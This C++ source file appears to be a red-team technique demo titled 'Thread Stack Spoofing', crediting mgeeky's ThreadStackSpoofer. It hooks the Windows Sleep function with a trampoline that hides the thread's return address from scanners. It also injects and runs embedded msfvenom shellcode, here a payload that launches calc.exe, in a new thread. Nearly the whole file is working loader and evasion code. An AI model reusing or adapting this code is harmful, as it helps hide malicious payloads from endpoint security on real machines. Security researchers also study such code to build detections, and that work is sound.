/*
* Title: Thread Stack Spoofing
* Resources:
*	- https://github.com/mgeeky/ThreadStackSpoofer
*/
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include "ThreadStackSpoofing.hpp"

_NtFlushInstructionCache ntFlushInstructionCache = nullptr;

HookedSleep g_hookedSleep;

BOOL InitFunctions() {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;

	ntFlushInstructionCache = reinterpret_cast<_NtFlushInstructionCache>(GetProcAddress(hNtdll, "NtFlushInstructionCache"));
	if (!ntFlushInstructionCache) return FALSE;

	return TRUE;
}

void WINAPI MySleep(DWORD dwMilliseconds) {
	// Locate this stack frame's return address.
	auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
	const auto origReturnAddr = *overwrite;

	*overwrite = 0;

	::SleepEx(dwMilliseconds, FALSE);

	// Restore original thread's call stack.
	*overwrite = origReturnAddr;
}

BOOL FastTrampoline(
	BOOL bInstallHook,
	BYTE* addressToHook,
	LPVOID lpJumpAddr,
	HookTrampolineBuffers* buffers
) {
#ifdef _WIN64
	uint8_t trampoline[] = {
		0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
		0x41, 0xFF, 0xE2											// jmp r10
	};
	uint64_t addr = (uint64_t)lpJumpAddr;
	memcpy(&trampoline[2], &addr, sizeof(addr));
#else
	uint8_t trampoline[] = {
		0xB8, 0x00, 0x00, 0x00, 0x00,	// mov eax, addr
		0xFF, 0xE0						// jmp eax
	};
	uint32_t addr = (uint32_t)lpJumpAddr;
	memcpy(&trampoline[1], &addr, sizeof(addr));
#endif

	DWORD dwSize = sizeof(trampoline);
	DWORD dwOldProtect = 0;
	BOOL bOutput = FALSE;

	if (bInstallHook) {
		if (buffers) {
			if (!buffers->previousBytes || buffers->previousBytesSize == 0)
				return FALSE;
			memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
		}

		if (::VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
			memcpy(addressToHook, trampoline, dwSize);
			bOutput = TRUE;
		}
	}
	else {
		if (!buffers)
			return FALSE;
		if (!buffers->originalBytes || buffers->originalBytesSize == 0)
			return FALSE;

		dwSize = buffers->originalBytesSize;

		if (::VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
			memcpy(addressToHook, buffers->originalBytes, dwSize);
			bOutput = TRUE;
		}
	}

	ntFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);

	::VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect);

	return TRUE;
}

BOOL HookSleep() {
	HookTrampolineBuffers buffers = { 0 };
	buffers.previousBytes = g_hookedSleep.sleepStub;
	buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);

	g_hookedSleep.origSleep = reinterpret_cast<_Sleep>(Sleep);

	if (!FastTrampoline(TRUE, (BYTE*)::Sleep, (void*)&MySleep, &buffers)) {
		return FALSE;
	}

	return TRUE;
}

VOID RunShellcode(LPVOID param) {
	auto func = ((void(*)())param);
	func();
}

BOOL InjectShellcode(unsigned char* shellcode, DWORD dwShellcodeSize, HandlePtr& thread) {
	auto alloc = ::VirtualAlloc(nullptr, dwShellcodeSize, MEM_COMMIT, PAGE_READWRITE);
	if (!alloc) return FALSE;

	memcpy(alloc, shellcode, dwShellcodeSize);

	DWORD dwOldProtect = 0;
	if (!VirtualProtect(alloc, dwShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect))
		return FALSE;

	thread.reset(::CreateThread(
		nullptr,
		0,
		(LPTHREAD_START_ROUTINE)RunShellcode,
		alloc,
		0,
		0
	));

	return thread.get() != nullptr;
}

BOOL ThreadStackSpoofing() {
	BOOL bSpoof = TRUE;

	// The shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	if (!InitFunctions())
		return FALSE;

	if (!HookSleep())
		return FALSE;

	HandlePtr thread(nullptr, &::CloseHandle);
	if (!InjectShellcode(shellcode, sizeof(shellcode), thread))
		return FALSE;

	WaitForSingleObject(thread.get(), INFINITE);

	return TRUE;
}
